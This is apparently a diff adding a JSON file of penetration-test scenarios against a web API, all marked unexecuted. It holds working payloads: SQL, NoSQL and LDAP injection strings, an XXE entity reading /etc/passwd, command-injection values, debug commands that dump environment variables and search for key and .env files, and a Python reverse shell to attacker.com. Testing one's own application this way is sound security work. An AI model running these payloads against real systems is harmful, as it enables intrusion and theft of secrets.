@@ -1,0 +1,559 @@
+{
+  "scenarios": [
+    {
+      "id": "auth_jwt_none_algorithm",
+      "description": "Test JWT None Algorithm Attack - attempting to bypass signature verification",
+      "endpoint": "POST /api/v2/users/login",
+      "method": "POST",
+      "payload": {
+        "user": {
+          "email": "attacker@example.com",
+          "password": "password123"
+        }
+      },
+      "auth_token": null,
+      "executed": false
+    },
+    {
+      "id": "auth_session_fixation",
+      "description": "Test Session Fixation Attack - attempting to force a user to use a known session identifier",
+      "endpoint": "POST /api/v2/users/login",
+      "method": "POST",
+      "payload": {
+        "user": {
+          "email": "victim@example.com",
+          "password": "password123"
+        }
+      },
+      "auth_token": null,
+      "executed": false
+    },
+    {
+      "id": "auth_concurrent_sessions",
+      "description": "Test Concurrent Session Management - attempting to exploit race conditions in session handling",
+      "endpoint": "POST /api/v2/users/login",
+      "method": "POST",
+      "payload": {
+        "user": {
+          "email": "target@example.com",
+          "password": "password123"
+        }
+      },
+      "auth_token": null,
+      "executed": false
+    },
+    {
+      "id": "auth_token_replay",
+      "description": "Test Token Replay Attack - attempting to reuse a previously valid token after logout",
+      "endpoint": "GET /api/user",
+      "method": "GET",
+      "payload": null,
+      "auth_token": "EXPIRED_TOKEN_VALUE",
+      "executed": false
+    },
+    {
+      "id": "auth_weak_jwt_secret",
+      "description": "Test JWT with weak secret - attempting to crack JWT secret with common values",
+      "endpoint": "POST /api/v2/users/login",
+      "method": "POST",
+      "payload": {
+        "user": {
+          "email": "user@example.com",
+          "password": "password123"
+        }
+      },
+      "auth_token": null,
+      "executed": false
+    },
+    {
+      "id": "auth_refresh_token_hijack",
+      "description": "Test Refresh Token Hijacking - attempting to steal and use refresh tokens",
+      "endpoint": "POST /api/v2/users/login",
+      "method": "POST",
+      "payload": {
+        "user": {
+          "email": "user@example.com",
+          "password": "password123"
+        }
+      },
+      "auth_token": null,
+      "executed": false
+    },
+    {
+      "id": "sql_blind_time_based",
+      "description": "Blind SQL Injection (Time-Based) - attempting to extract data via time delays",
+      "endpoint": "POST /api/v2/users/login",
+      "method": "POST",
+      "payload": {
+        "user": {
+          "email": "' OR (SELECT SLEEP(5))-- ",
+          "password": "anything"
+        }
+      },
+      "auth_token": null,
+      "executed": false
+    },
+    {
+      "id": "sql_blind_boolean",
+      "description": "Blind SQL Injection (Boolean-Based) - attempting to extract data via boolean conditions",
+      "endpoint": "POST /api/v2/users/login",
+      "method": "POST",
+      "payload": {
+        "user": {
+          "email": "' OR 1=1-- ",
+          "password": "anything"
+        }
+      },
+      "auth_token": null,
+      "executed": false
+    },
+    {
+      "id": "nosql_injection",
+      "description": "NoSQL Injection Attack - attempting to exploit MongoDB query structure",
+      "endpoint": "POST /api/v2/users/login",
+      "method": "POST",
+      "payload": {
+        "user": {
+          "email": {
+            "$ne": null
+          },
+          "password": {
+            "$ne": null
+          }
+        }
+      },
+      "auth_token": null,
+      "executed": false
+    },
+    {
+      "id": "xxe_injection",
+      "description": "XML External Entity (XXE) Injection - attempting to read system files",
+      "endpoint": "POST /api/articles",
+      "method": "POST",
+      "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><article><title>&xxe;</title><description>Test</description><body>Test</body></article>",
+      "auth_token": "VALID_TOKEN",
+      "executed": false
+    },
+    {
+      "id": "ssti_jinja2",
+      "description": "Server-Side Template Injection (Jinja2) - attempting to execute code via template",
+      "endpoint": "POST /api/articles",
+      "method": "POST",
+      "payload": {
+        "article": {
+          "title": "{{7*7}}",
+          "description": "Test SSTI",
+          "body": "{% for x in range(10) %}SSTI Test{% endfor %}"
+        }
+      },
+      "auth_token": "VALID_TOKEN",
+      "executed": false
+    },
+    {
+      "id": "ssti_thymeleaf",
+      "description": "Server-Side Template Injection (Thymeleaf) - attempting to execute code via template",
+      "endpoint": "POST /api/articles",
+      "method": "POST",
+      "payload": {
+        "article": {
+          "title": "__${7*7}__",
+          "description": "Test SSTI",
+          "body": "Test SSTI"
+        }
+      },
+      "auth_token": "VALID_TOKEN",
+      "executed": false
+    },
+    {
+      "id": "header_injection",
+      "description": "HTTP Header Injection - attempting to inject malicious headers",
+      "endpoint": "GET /api/articles",
+      "method": "GET",
+      "payload": null,
+      "auth_token": "VALID_TOKEN",
+      "executed": false
+    },
+    {
+      "id": "ldap_injection",
+      "description": "LDAP Injection Attack - attempting to bypass authentication",
+      "endpoint": "POST /api/v2/users/login",
+      "method": "POST",
+      "payload": {
+        "user": {
+          "email": "*)(|(mail=*))",
+          "password": "password123"
+        }
+      },
+      "auth_token": null,
+      "executed": false
+    },
+    {
+      "id": "command_injection",
+      "description": "OS Command Injection - attempting to execute system commands",
+      "endpoint": "POST /api/articles",
+      "method": "POST",
+      "payload": {
+        "article": {
+          "title": "Test; cat /etc/passwd",
+          "description": "Test; ls -la",
+          "body": "Test; ping -c 4 8.8.8.8"
+        }
+      },
+      "auth_token": "VALID_TOKEN",
+      "executed": false
+    },
+    {
+      "id": "race_condition_payment",
+      "description": "Race Condition on Payment Processing - attempting to exploit concurrent payment requests",
+      "endpoint": "POST /api/membership",
+      "method": "POST",
+      "payload": {
+        "number": "4111111111111111",
+        "cvc": "123",
+        "expiry": "12/25",
+        "name": "Test User"
+      },
+      "auth_token": "VALID_TOKEN",
+      "executed": false
+    },
+    {
+      "id": "payment_negative_amount",
+      "description": "Payment with Negative Amount - attempting to credit instead of debit",
+      "endpoint": "POST /api/membership",
+      "method": "POST",
+      "payload": {
+        "number": "4111111111111111",
+        "cvc": "123",
+        "expiry": "12/25",
+        "name": "Test User",
+        "amount": -100
+      },
+      "auth_token": "VALID_TOKEN",
+      "executed": false
+    },
+    {
+      "id": "payment_currency_manipulation",
+      "description": "Payment Currency Manipulation - attempting to use invalid or advantageous currency",
+      "endpoint": "POST /api/membership",
+      "method": "POST",
+      "payload": {
+        "number": "4111111111111111",
+        "cvc": "123",
+        "expiry": "12/25",
+        "name": "Test User",
+        "currency": "XYZ"
+      },
+      "auth_token": "VALID_TOKEN",
+      "executed": false
+    },
+    {
+      "id": "workflow_bypass",
+      "description": "Workflow Bypass Attack - attempting to skip required steps in business process",
+      "endpoint": "POST /api/membership",
+      "method": "POST",
+      "payload": {
+        "number": "4111111111111111",
+        "cvc": "123",
+        "expiry": "12/25",
+        "name": "Test User",
+        "skip_verification": true
+      },
+      "auth_token": "VALID_TOKEN",
+      "executed": false
+    },
+    {
+      "id": "toctou_profile_update",
+      "description": "Time-of-check to time-of-use (TOCTOU) Attack - exploiting validation timing",
+      "endpoint": "PUT /api/user",
+      "method": "PUT",
+      "payload": {
+        "user": {
+          "username": "victim",
+          "email": "victim@example.com",
+          "admin": true
+        }
+      },
+      "auth_token": "VALID_TOKEN",
+      "executed": false
+    },
+    {
+      "id": "subscription_bypass",
+      "description": "Subscription Bypass Attack - attempting to access premium features without payment",
+      "endpoint": "GET /api/articles/feed",
+      "method": "GET",
+      "payload": null,
+      "auth_token": "VALID_TOKEN",
+      "executed": false
+    },
+    {
+      "id": "double_spending",
+      "description": "Double-Spending Vulnerability - attempting to trigger multiple payments with single action",
+      "endpoint": "POST /api/membership",
+      "method": "POST",
+      "payload": {
+        "number": "4111111111111111",
+        "cvc": "123",
+        "expiry": "12/25",
+        "name": "Test User",
+        "transaction_id": "DUPLICATE_ID"
+      },
+      "auth_token": "VALID_TOKEN",
+      "executed": false
+    },
+    {
+      "id": "http_method_override",
+      "description": "HTTP Method Override Attack - attempting to bypass method restrictions",
+      "endpoint": "GET /api/articles/{slug}",
+      "method": "GET",
+      "payload": null,
+      "auth_token": "VALID_TOKEN",
+      "executed": false
+    },
+    {
+      "id": "content_type_confusion",
+      "description": "Content-Type Confusion Attack - attempting to send XML with JSON content type",
+      "endpoint": "POST /api/articles",
+      "method": "POST",
+      "payload": "<?xml version=\"1.0\"?><article><title>Test</title><description>Test</description><body>Test</body></article>",
+      "auth_token": "VALID_TOKEN",
+      "executed": false
+    },
+    {
+      "id": "api_versioning_bypass",
+      "description": "API Versioning Security Bypass - attempting to access deprecated or future API versions",
+      "endpoint": "POST /api/users",
+      "method": "POST",
+      "payload": {
+        "user": {
+          "email": "attacker@example.com",
+          "password": "password123",
+          "username": "attacker"
+        }
+      },
+      "auth_token": null,
+      "executed": false
+    },
+    {
+      "id": "excessive_data_exposure",
+      "description": "Excessive Data Exposure Testing - attempting to extract sensitive data",
+      "endpoint": "GET /api/user",
+      "method": "GET",
+      "payload": null,
+      "auth_token": "VALID_TOKEN",
+      "executed": false
+    },
+    {
+      "id": "parameter_pollution",
+      "description": "HTTP Parameter Pollution Attack - attempting to confuse application logic with duplicate parameters",
+      "endpoint": "GET /api/articles",
+      "method": "GET",
+      "payload": null,
+      "auth_token": "VALID_TOKEN",
+      "executed": false
+    },
+    {
+      "id": "http_verb_tampering",
+      "description": "HTTP Verb Tampering - attempting to bypass access controls with alternate HTTP methods",
+      "endpoint": "GET /api/articles/{slug}",
+      "method": "HEAD",
+      "payload": null,
+      "auth_token": null,
+      "executed": false
+    },
+    {
+      "id": "uuid_manipulation",
+      "description": "UUID Manipulation and Prediction - attempting to access resources with predicted or manipulated IDs",
+      "endpoint": "GET /api/articles/{slug}",
+      "method": "GET",
+      "payload": null,
+      "auth_token": "VALID_TOKEN",
+      "executed": false
+    },
+    {
+      "id": "bulk_operation_bypass",
+      "description": "Bulk Operation Authorization Bypass - attempting to perform unauthorized bulk actions",
+      "endpoint": "POST /api/articles",
+      "method": "POST",
+      "payload": {
+        "articles": [
+          {
+            "title": "Test 1",
+            "description": "Test",
+            "body": "Test"
+          },
+          {
+            "title": "Test 2",
+            "description": "Test",
+            "body": "Test"
+          }
+        ]
+      },
+      "auth_token": "VALID_TOKEN",
+      "executed": false
+    },
+    {
+      "id": "nested_resource_access",
+      "description": "Nested Resource Access Control Bypass - attempting to access unauthorized nested resources",
+      "endpoint": "GET /api/articles/{slug}/comments",
+      "method": "GET",
+      "payload": null,
+      "auth_token": "VALID_TOKEN_USER_A",
+      "executed": false
+    },
+    {
+      "id": "cross_tenant_access",
+      "description": "Cross-Tenant Data Access - attempting to access another tenant's data",
+      "endpoint": "GET /api/profiles/{username}",
+      "method": "GET",
+      "payload": null,
+      "auth_token": "VALID_TOKEN_TENANT_A",
+      "executed": false
+    },
+    {
+      "id": "privilege_escalation",
+      "description": "Privilege Escalation through Parameter Manipulation - attempting to gain admin privileges",
+      "endpoint": "PUT /api/user",
+      "method": "PUT",
+      "payload": {
+        "user": {
+          "username": "normal_user",
+          "email": "user@example.com",
+          "admin": true
+        }
+      },
+      "auth_token": "VALID_TOKEN_NORMAL_USER",
+      "executed": false
+    },
+    {
+      "id": "function_level_bypass",
+      "description": "Function-Level Access Control Bypass - attempting to access admin-only functionality",
+      "endpoint": "GET /api/user",
+      "method": "GET",
+      "payload": null,
+      "auth_token": "VALID_TOKEN_NORMAL_USER",
+      "executed": false
+    },
+    {
+      "id": "security_headers_testing",
+      "description": "Security Headers Testing - checking for missing or misconfigured security headers",
+      "endpoint": "GET /api/articles",
+      "method": "GET",
+      "payload": null,
+      "auth_token": null,
+      "executed": false
+    },
+    {
+      "id": "cors_misconfiguration",
+      "description": "CORS Misconfiguration Testing - checking for insecure CORS policies",
+      "endpoint": "GET /api/user",
+      "method": "GET",
+      "payload": null,
+      "auth_token": "VALID_TOKEN",
+      "executed": false
+    },
+    {
+      "id": "debug_env_disclosure",
+      "description": "Debug Endpoint - Environment Variable Disclosure",
+      "endpoint": "POST /api/debug",
+      "method": "POST",
+      "payload": {
+        "body": {
+          "command": "env"
+        }
+      },
+      "auth_token": "VALID_TOKEN",
+      "executed": false
+    },
+    {
+      "id": "debug_config_access",
+      "description": "Debug Endpoint - Configuration File Access",
+      "endpoint": "POST /api/debug",
+      "method": "POST",
+      "payload": {
+        "body": {
+          "command": "cat config/database.yml"
+        }
+      },
+      "auth_token": "VALID_TOKEN",
+      "executed": false
+    },
+    {
+      "id": "debug_system_info",
+      "description": "Debug Endpoint - System Information Disclosure",
+      "endpoint": "POST /api/debug",
+      "method": "POST",
+      "payload": {
+        "body": {
+          "command": "ps aux"
+        }
+      },
+      "auth_token": "VALID_TOKEN",
+      "executed": false
+    },
+    {
+      "id": "debug_network_info",
+      "description": "Debug Endpoint - Network Information Disclosure",
+      "endpoint": "POST /api/debug",
+      "method": "POST",
+      "payload": {
+        "body": {
+          "command": "netstat -tulpn"
+        }
+      },
+      "auth_token": "VALID_TOKEN",
+      "executed": false
+    },
+    {
+      "id": "debug_file_access",
+      "description": "Debug Endpoint - Sensitive File Access",
+      "endpoint": "POST /api/debug",
+      "method": "POST",
+      "payload": {
+        "body": {
+          "command": "find / -name '*.key' -o -name '*.pem' -o -name '*.env'"
+        }
+      },
+      "auth_token": "VALID_TOKEN",
+      "executed": false
+    },
+    {
+      "id": "debug_rce",
+      "description": "Debug Endpoint - Remote Code Execution",
+      "endpoint": "POST /api/debug",
+      "method": "POST",
+      "payload": {
+        "body": {
+          "command": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"attacker.com\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])'"
+        }
+      },
+      "auth_token": "VALID_TOKEN",
+      "executed": false
+    },
+    {
+      "id": "error_handling_disclosure",
+      "description": "Error Handling Information Disclosure - attempting to trigger verbose error messages",
+      "endpoint": "GET /api/articles/{slug}",
+      "method": "GET",
+      "payload": null,
+      "auth_token": "VALID_TOKEN",
+      "executed": false
+    },
+    {
+      "id": "stack_trace_exposure",
+      "description": "Stack Trace Exposure - attempting to trigger and expose application stack traces",
+      "endpoint": "POST /api/articles",
+      "method": "POST",
+      "payload": {
+        "article": {
+          "title": null,
+          "description": {
+            "attack": "test"
+          },
+          "body": 12345
+        }
+      },
+      "auth_token": "VALID_TOKEN",
+      "executed": false
+    }
+  ]
+}
